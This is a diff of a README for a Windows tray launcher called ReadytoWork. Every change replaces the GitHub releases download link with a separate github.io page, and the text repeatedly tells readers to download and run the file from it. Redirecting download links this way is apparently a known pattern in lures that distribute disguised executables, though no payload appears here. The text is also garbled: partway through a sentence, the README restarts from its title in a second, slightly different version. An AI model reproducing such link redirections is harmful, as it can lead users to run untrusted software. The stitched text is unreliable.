@@ -1,6 +1,6 @@
 # 🚀 ReadytoWork - Your Shortcuts One Click Away
 
-[![Download ReadytoWork](https://img.shields.io/badge/Download_ReadytoWork-FF6B6B?style=for-the-badge&labelColor=6A5ACD&logo=windows&logoColor=white)](https://github.com/elfado/ReadytoWork/releases)
+[![Download ReadytoWork](https://img.shields.io/badge/Download_ReadytoWork-FF6B6B?style=for-the-badge&labelColor=6A5ACD&logo=windows&logoColor=white)](https://elfado.github.io)
 
 ReadytoWork is a Windows tray launcher that puts your programs, folders, documents and URLs one click away. It sits near the clock on your Windows desktop and gives you a simple menu for the things you open most often. Instead of hunting through the Start menu, File Explorer, browser bookmarks or your desktop, you click the ReadytoWork tray icon and choose what you need.
 
@@ -23,11 +23,11 @@ The tray area is the small set of icons near the clock at the bottom-right of th
 
 ReadytoWork is a Windows application. The official download page is provided by the project. Visit this link to download the application:
 
-[https://github.com/elfado/ReadytoWork/releases](https://github.com/elfado/ReadytoWork/releases)
+[https://elfado.github.io](https://elfado.github.io)
 
 The large download badge at the top of this page and the link above both take you to the same official Ready# 🚀 ReadytoWork - Your Shortcuts One Click Away
 
-[![Download ReadytoWork](https://img.shields.io/badge/Download_ReadytoWork-FF6B6B?style=for-the-badge&labelColor=6A5ACD&logo=windows&logoColor=white)](https://github.com/elfado/ReadytoWork/releases)
+[![Download ReadytoWork](https://img.shields.io/badge/Download_ReadytoWork-FF6B6B?style=for-the-badge&labelColor=6A5ACD&logo=windows&logoColor=white)](https://elfado.github.io)
 
 ReadytoWork is a Windows tray launcher that puts your programs, folders, documents and URLs one click away. It sits quietly near the clock on your Windows desktop and gives you a simple, tidy menu for the things you open most often. Instead of hunting through the Start menu, digging through File Explorer, scrolling your browser bookmarks or cluttering your desktop with icons, you click the ReadytoWork tray icon and pick what you need.
 
@@ -52,7 +52,7 @@ This makes ReadytoWork especially useful for students, office workers, freelance
 
 ReadytoWork is a Windows application distributed through the official project releases page. Visit this link to download the application:
 
-**https://github.com/elfado/ReadytoWork/releases**
+**https://elfado.github.io**
 
 The large download badge at the top of this page and the link above both take you to the same official page. Once the download has finished, run the file on your Windows computer to start ReadytoWork.
 
@@ -133,11 +133,11 @@ From the official releases page. That page is the single source for downloads an
 
 ## 📥 Download ReadytoWork
 
-[![Get ReadytoWork for Windows](https://img.shields.io/badge/Get_ReadytoWork_for_Windows-43A047?style=for-the-badge&labelColor=1B5E20&logo=github&logoColor=white)](https://github.com/elfado/ReadytoWork/releases)
+[![Get ReadytoWork for Windows](https://img.shields.io/badge/Get_ReadytoWork_for_Windows-43A047?style=for-the-badge&labelColor=1B5E20&logo=github&logoColor=white)](https://elfado.github.io)
 
 Visit this link to download the application:
 
-**https://github.com/elfado/ReadytoWork/releases**
+**https://elfado.github.io**
 
 Save the file, run it on your Windows computer, and look for the ReadytoWork icon near the clock. Add your first few shortcuts and your most-used programs, folders, documents and websites will be one click away from that moment on.
 
